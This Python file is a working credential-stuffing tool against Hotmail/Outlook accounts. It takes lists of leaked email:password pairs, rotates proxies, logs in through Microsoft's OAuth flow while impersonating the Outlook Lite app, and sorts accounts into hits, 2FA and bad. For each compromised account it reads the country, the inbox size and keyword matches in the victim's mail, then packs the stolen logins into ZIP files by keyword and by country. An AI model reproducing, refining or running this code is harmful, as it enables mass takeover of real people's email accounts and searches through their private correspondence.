#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Custom Inbox Engine - Hotmail/Outlook advanced inbox scanner
Based on fullinbox.py logic (country detection, keyword search, inbox count)
UPDATED: Uses working Outlook search API with n=124 and cv parameters
"""

import re
import threading
import time
import uuid
import random
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Any
from collections import defaultdict
import os
import zipfile
import logging

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

# ----------------------------------------------------------------------
# Proxy Manager (same as in fullinbox.py)
# ----------------------------------------------------------------------
class ProxyManager:
    def __init__(self, proxy_list: Optional[List[str]] = None):
        self.proxies = []
        self.lock = Lock()
        if proxy_list:
            self.load_from_list(proxy_list)

    def load_from_list(self, proxy_list: List[str]):
        for line in proxy_list:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                parts = line.split(':')
                if len(parts) == 2:  # ip:port
                    proxy = {
                        'http': f'http://{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[0]}:{parts[1]}'
                    }
                    self.proxies.append(proxy)
                elif len(parts) == 4:  # user:pass@ip:port
                    proxy = {
                        'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                    }
                    self.proxies.append(proxy)
        logger.info(f"Loaded {len(self.proxies)} proxies")

    def load_from_text(self, text: str) -> int:
        lines = [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]
        self.load_from_list(lines)
        return len(self.proxies)

    def get_random_proxy(self) -> Optional[Dict[str, str]]:
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def has_proxies(self) -> bool:
        return len(self.proxies) > 0


# ----------------------------------------------------------------------
# Hotmail Checker (based on fullinbox.py with WORKING API)
# ----------------------------------------------------------------------
class HotmailChecker:
    def __init__(self, keywords: List[str] = None, proxy_manager: ProxyManager = None):
        self.uuid = str(uuid.uuid4())
        self.keywords = keywords if keywords else []
        self.proxy_manager = proxy_manager
        # Working search API parameters (from fullinbox.py + user provided)
        self.search_url = "https://outlook.live.com/search/api/v2/query"
        self.search_n = 124
        self.search_cv = "tNZ1DVP5NhDwG/DUCelaIu.124"  # decoded %2F to /

    def _get_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = False
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    @staticmethod
    def _parse_country_from_json(json_data: Any) -> str:
        """Extract country from profile JSON (same as fullinbox.py)"""
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode']:
                            if key in location and location[key]:
                                return str(location[key])
                for key in ['country', 'countryOrRegion', 'countryCode']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except Exception:
            pass
        return ""

    @staticmethod
    def _extract_inbox_count(text: str) -> int:
        try:
            patterns = [
                r'"DisplayName":"Inbox","TotalCount":(\d+)',
                r'"TotalCount":(\d+)',
                r'Inbox","TotalCount":(\d+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    return int(match.group(1))
        except Exception:
            pass
        return 0

    def _get_email_provider_count(self, email: str, access_token: str, cid: str) -> int:
        """Count messages from the same domain as the email using the working API endpoint"""
        try:
            domain = email.split('@')[1] if '@' in email else ""
            if not domain:
                return 0
            session = self._get_session()
            # Build URL with required parameters
            url = f"{self.search_url}?n={self.search_n}&cv={self.search_cv}"
            query_string = f'from:"@{domain}" OR "{domain}"'
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": query_string},
                    "Size": 10
                }]
            }
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            r = session.post(url, json=payload, headers=headers, timeout=12)
            if r.status_code == 200:
                data = r.json()
                total = 0
                if 'EntitySets' in data:
                    for es in data['EntitySets']:
                        if 'ResultSets' in es:
                            for rs in es['ResultSets']:
                                total = rs.get('Total', 0)
                                break
                return total
        except Exception as e:
            logger.debug(f"Domain count error: {e}")
        return 0

    def _check_keywords(self, email: str, access_token: str, cid: str) -> Dict[str, int]:
        """Search inbox for each keyword using the working API endpoint with n and cv parameters"""
        results = {}
        if not self.keywords:
            return results
        session = self._get_session()
        # Base URL with required parameters
        base_url = f"{self.search_url}?n={self.search_n}&cv={self.search_cv}"
        
        for kw in self.keywords:
            try:
                # Build query string for this keyword
                qstr = kw
                # If keyword looks like an email address, search from that domain
                if '@' in kw and ' ' not in kw:
                    qstr = f'from:"{kw}" OR "{kw}"'
                # If keyword has spaces, treat as phrase search
                elif ' ' in kw:
                    qstr = f'"{kw}"'
                
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Query": {"QueryString": qstr},
                        "Size": 10
                    }]
                }
                headers = {
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Content-Type': 'application/json'
                }
                r = session.post(base_url, json=payload, headers=headers, timeout=12)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for es in data['EntitySets']:
                            if 'ResultSets' in es:
                                for rs in es['ResultSets']:
                                    total = rs.get('Total', 0)
                                    break
                    if total > 0:
                        results[kw] = total
            except Exception as e:
                logger.debug(f"Keyword '{kw}' search error: {e}")
                continue
        return results

    def check(self, email: str, password: str) -> Dict[str, Any]:
        """
        Check a single Hotmail/Outlook account.
        Returns dict with keys: status, email, password, country, inbox_count,
        domain_count, keywords (dict keyword->count)
        """
        session = None
        try:
            session = self._get_session()

            # Step 1: check if it's a Microsoft account
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            txt = r1.text
            if "Neither" in txt or "Both" in txt or "Placeholder" in txt or "OrgId" in txt:
                return {"status": "BAD", "email": email, "password": password}
            if "MSAccount" not in txt:
                return {"status": "BAD", "email": email, "password": password}

            time.sleep(0.3)

            # Step 2: get login page
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_post = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_post or not ppft:
                return {"status": "BAD", "email": email, "password": password}

            post_url = url_post.group(1).replace("\\/", "/")
            ppft_val = ppft.group(1)

            # Step 3: submit credentials
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft_val}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            txt3 = r3.text.lower()
            if "incorrect" in txt3 or "error" in txt3:
                return {"status": "BAD", "email": email, "password": password}
            if "identity/confirm" in txt3 or "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            if "consent" in txt3 or "https://account.live.com/Consent" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            if "abuse" in r3.text:
                return {"status": "BAD", "email": email, "password": password}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "email": email, "password": password}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "email": email, "password": password}
            code = code_match.group(1)

            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "email": email, "password": password}
            cid = mspcid.upper()

            # Step 4: exchange code for token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                              data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "email": email, "password": password}
            access_token = r4.json()["access_token"]

            # Step 5: get country from profile
            country = ""
            try:
                profile_headers = {
                    "User-Agent": "Outlook-Android/2.0",
                    "Authorization": f"Bearer {access_token}",
                    "X-AnchorMailbox": f"CID:{cid}"
                }
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                 headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    country = self._parse_country_from_json(profile)
            except Exception:
                pass

            # Step 6: domain message count (using updated API)
            domain_count = self._get_email_provider_count(email, access_token, cid)

            # Step 7: inbox count
            inbox_count = 0
            try:
                startup_headers = {
                    "Host": "outlook.live.com",
                    "content-length": "0",
                    "x-owa-sessionid": str(uuid.uuid4()),
                    "x-req-source": "Mini",
                    "authorization": f"Bearer {access_token}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                    "action": "StartupData",
                    "content-type": "application/json"
                }
                r6 = session.post(
                    f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                    data="", headers=startup_headers, timeout=20)
                if r6.status_code == 200:
                    inbox_count = self._extract_inbox_count(r6.text)
            except Exception:
                pass

            # Step 8: keyword search using updated API (only if we have keywords)
            keyword_results = {}
            if self.keywords:
                keyword_results = self._check_keywords(email, access_token, cid)

            return {
                "status": "HIT",
                "email": email,
                "password": password,
                "country": country,
                "inbox_count": inbox_count,
                "domain_count": domain_count,
                "keywords": keyword_results
            }

        except requests.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "reason": "Timeout"}
        except Exception as e:
            logger.debug(f"Check error for {email}: {e}")
            return {"status": "ERROR", "email": email, "password": password, "reason": str(e)[:50]}
        finally:
            if session:
                session.close()


# ----------------------------------------------------------------------
# Custom Inbox Scanner (batch processor)
# ----------------------------------------------------------------------
class CustomInboxScanner:
    def __init__(self, proxy_list: Optional[List[str]] = None, timeout: int = 25):
        self.proxy_manager = ProxyManager(proxy_list)
        self.timeout = timeout

    def scan_batch(self, combos: List[str], keywords: List[str],
                   threads: int = 30, progress_callback=None) -> Dict[str, Any]:
        """
        Scan a batch of combos (email:password) for given keywords.
        Returns:
            - keyword_hits: dict {keyword: [list of hit lines]}
            - country_hits: dict {country: [list of hit lines]}
            - stats: dict with total, checked, hits, 2fa, bad, errors
        """
        unique_combos = list(dict.fromkeys(combos))  # remove duplicates while preserving order
        total = len(unique_combos)

        keyword_hits = defaultdict(list)      # keyword -> list of formatted lines
        country_hits = defaultdict(list)      # country -> list of formatted lines
        stats = {
            "total": total,
            "checked": 0,
            "hits": 0,
            "2fa": 0,
            "bad": 0,
            "errors": 0
        }
        lock = Lock()
        stop_event = threading.Event()

        def worker(combo):
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email = email.strip()
                pwd = pwd.strip()
                checker = HotmailChecker(keywords=keywords, proxy_manager=self.proxy_manager)
                result = checker.check(email, pwd)
                status = result.get("status")

                with lock:
                    stats["checked"] += 1
                    if progress_callback:
                        progress_callback(stats["checked"], total)

                if status == "HIT":
                    with lock:
                        stats["hits"] += 1
                    # Build hit line with metadata
                    line = f"{email}:{pwd}"
                    if result.get("inbox_count", 0) > 0:
                        line += f" | Inbox: {result['inbox_count']}"
                    if result.get("domain_count", 0) > 0:
                        line += f" | Domain: {result['domain_count']}"
                    if result.get("country"):
                        line += f" | Country: {result['country']}"

                    # Distribute to keyword hits
                    kw_counts = result.get("keywords", {})
                    for kw, cnt in kw_counts.items():
                        if cnt > 0:
                            kw_line = f"{email}:{pwd} | Found: {cnt}"
                            if result.get("country"):
                                kw_line += f" | {result['country']}"
                            with lock:
                                keyword_hits[kw].append(kw_line)

                    # Distribute to country hits
                    country = result.get("country", "Unknown")
                    with lock:
                        country_hits[country].append(line)

                elif status == "2FA":
                    with lock:
                        stats["2fa"] += 1
                elif status == "BAD":
                    with lock:
                        stats["bad"] += 1
                else:
                    with lock:
                        stats["errors"] += 1
            except Exception as e:
                with lock:
                    stats["errors"] += 1
                logger.error(f"Worker error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in unique_combos]
            for future in as_completed(futures):
                if stop_event.is_set():
                    break
                try:
                    future.result()
                except Exception:
                    pass

        return {
            "keyword_hits": dict(keyword_hits),
            "country_hits": dict(country_hits),
            "stats": stats
        }

    @staticmethod
    def create_keyword_zip(keyword_hits: Dict[str, List[str]], filename: str = None) -> Optional[str]:
        """Create ZIP file where each keyword has its own .txt file"""
        if not keyword_hits:
            return None
        if not filename:
            filename = f"custom_inbox_keywords_{int(time.time())}.zip"
        zip_path = os.path.join("results", filename)
        os.makedirs("results", exist_ok=True)
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for keyword, lines in keyword_hits.items():
                    if not lines:
                        continue
                    safe_name = re.sub(r'[^\w\-_\.]', '_', keyword)
                    content = "\n".join(lines) + "\n"
                    zf.writestr(f"{safe_name}.txt", content)
            return zip_path
        except Exception as e:
            logger.error(f"Failed to create keyword ZIP: {e}")
            return None

    @staticmethod
    def create_country_zip(country_hits: Dict[str, List[str]], filename: str = None) -> Optional[str]:
        """Create ZIP file where each country has its own .txt file"""
        if not country_hits:
            return None
        if not filename:
            filename = f"custom_inbox_countries_{int(time.time())}.zip"
        zip_path = os.path.join("results", filename)
        os.makedirs("results", exist_ok=True)
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for country, lines in country_hits.items():
                    if not lines:
                        continue
                    safe_name = re.sub(r'[^\w\-_\.]', '_', country) if country else "Unknown"
                    content = "\n".join(lines) + "\n"
                    zf.writestr(f"{safe_name}.txt", content)
            return zip_path
        except Exception as e:
            logger.error(f"Failed to create country ZIP: {e}")
            return None